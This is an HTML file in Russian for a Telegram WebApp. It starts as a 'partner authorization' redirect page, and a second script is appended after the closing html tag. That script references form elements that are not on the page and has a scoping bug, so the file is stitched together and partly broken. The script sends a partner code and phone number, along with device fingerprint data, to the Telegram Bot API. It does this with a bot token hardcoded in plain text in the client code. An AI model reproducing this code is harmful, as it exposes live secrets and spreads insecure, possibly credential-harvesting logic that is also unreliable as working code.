<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Авторизация партнера - Перенаправление</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .redirect-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            margin: 0 0 10px 0;
            font-size: 24px;
        }
        p {
            margin: 0;
            opacity: 0.8;
        }
        .manual-link {
            margin-top: 20px;
        }
        .manual-link a {
            color: #ffd700;
            text-decoration: none;
            font-weight: bold;
        }
        .manual-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="redirect-container">
        <div class="spinner"></div>
        <h2>Перенаправление...</h2>
        <p>Переходим к универсальной форме авторизации</p>
        <div class="manual-link">
            <p>Если автоматический переход не работает:</p>
            <a href="auth_universal.html" id="manualLink">Нажмите здесь</a>
        </div>
    </div>

    <script>
        // Автоматическое перенаправление через 2 секунды
        setTimeout(function() {
            window.location.href = 'auth_universal.html';
        }, 2000);

        // Дополнительная проверка для Telegram WebApp
        if (window.Telegram && window.Telegram.WebApp) {
            // Для Telegram WebApp делаем немедленный переход
            setTimeout(function() {
                window.location.href = 'auth_universal.html';
            }, 500);
        }

        // Обработчик для ручной ссылки
        document.getElementById('manualLink').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'auth_universal.html';
        });
    </script>
</body>
</html>

    <script>
        // Инициализация Telegram WebApp
        let tg = window.Telegram.WebApp;
        
        if (tg) {
        tg.ready();
            tg.expand();
            
            // Получаем информацию о платформе
            const platformInfo = {
                isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
                isDesktop: !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)),
                isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
                isAndroid: /Android/.test(navigator.userAgent),
                isTelegram: !!window.Telegram,
                isWeb: !window.Telegram,
                isWebView: !!window.Telegram,
                telegramClientType: tg.initDataUnsafe?.user?.language_code || 'unknown',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                touchSupport: 'ontouchstart' in window,
                maxTouchPoints: navigator.maxTouchPoints || 0,
                screenSize: `${screen.width}x${screen.height}`,
                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
                devicePixelRatio: window.devicePixelRatio || 1,
                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
            };
            
            document.getElementById('platformInfo').textContent = 
                `Платформа: ${platformInfo.platform} | Мобильный: ${platformInfo.isMobile} | Telegram: ${platformInfo.isTelegram}`;
        }

        // Обработка формы авторизации
        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const partnerCode = document.getElementById('partnerCode').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            
            if (!partnerCode || !phoneNumber) {
                showStatus('Пожалуйста, заполните все поля', 'error');
                return;
            }
            
            // Показываем загрузку
            showLoading(true);
            hideStatus();
            
            try {
                // Собираем данные для отправки
                const authData = {
                    code: partnerCode,
                    phone: phoneNumber,
                    platform: platformInfo,
                    timestamp: Date.now()
                };
                
                // Пытаемся отправить через Telegram WebApp API
                if (tg && tg.sendData) {
                    try {
                        await tg.sendData(JSON.stringify(authData));
                        showStatus('Данные отправлены через Telegram WebApp', 'success');
                return;
                    } catch (error) {
                        console.log('tg.sendData не сработал, используем fallback');
                    }
                }
                
                // Fallback: отправляем через HTTP
                await sendDataViaHTTP(authData);
                
            } catch (error) {
                console.error('Ошибка авторизации:', error);
                showStatus('Ошибка при отправке данных. Попробуйте еще раз.', 'error');
            } finally {
                showLoading(false);
            }
        });

        // HTTP fallback для отправки данных
        async function sendDataViaHTTP(data) {
            try {
                // Получаем chat_id из Telegram WebApp
                const chatId = getCurrentChatId();
                
                if (!chatId) {
                    throw new Error('Не удалось получить chat_id');
                }
                
                // Отправляем данные на бота через HTTP
                const response = await fetch(`https://api.telegram.org/bot${getBotToken()}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `🔐 Авторизация\nКод: ${data.code}\nТелефон: ${data.phone}`
                    })
                });
                
                if (response.ok) {
                    showStatus('Данные отправлены через HTTP fallback', 'success');
                } else {
                    throw new Error('HTTP запрос не удался');
                }
                
            } catch (error) {
                console.error('HTTP fallback error:', error);
                showStatus('Ошибка HTTP fallback. Используйте команду /auth в боте.', 'error');
            }
        }

        // Получение chat_id из Telegram WebApp
        function getCurrentChatId() {
            try {
                // Пытаемся получить из initData
                if (tg.initData) {
                    const urlParams = new URLSearchParams(tg.initData);
                    const user = JSON.parse(urlParams.get('user') || '{}');
                    if (user.id) {
                        return user.id;
                    }
                }
                
                // Пытаемся получить из startParam
                if (tg.initDataUnsafe?.start_param) {
                    return tg.initDataUnsafe.start_param;
                }
                
                // Пытаемся получить из query_id
                if (tg.initDataUnsafe?.query_id) {
                    return tg.initDataUnsafe.query_id;
                }
                
                return null;
            } catch (error) {
                console.error('Ошибка получения chat_id:', error);
                return null;
            }
        }

        // Получение токена бота (в реальном приложении должен быть скрыт)
        function getBotToken() {
            // В реальном приложении токен должен быть получен безопасным способом
            return '8232668997:AAHCvWtcjtqw5b5tuYrYwg1lCz0oItjhUEg';
        }

        // Показ/скрытие загрузки
        function showLoading(show) {
            document.getElementById('loading').style.display = show ? 'block' : 'none';
            document.getElementById('authButton').disabled = show;
        }

        // Показ статуса
        function showStatus(message, type) {
            const statusElement = document.getElementById('statusMessage');
            statusElement.textContent = message;
            statusElement.className = `status-message status-${type}`;
            statusElement.style.display = 'block';
        }

        // Скрытие статуса
        function hideStatus() {
            document.getElementById('statusMessage').style.display = 'none';
        }

        // Очистка формы
        function clearForm() {
            document.getElementById('authForm').reset();
            hideStatus();
        }
    </script>
</body>
</html>
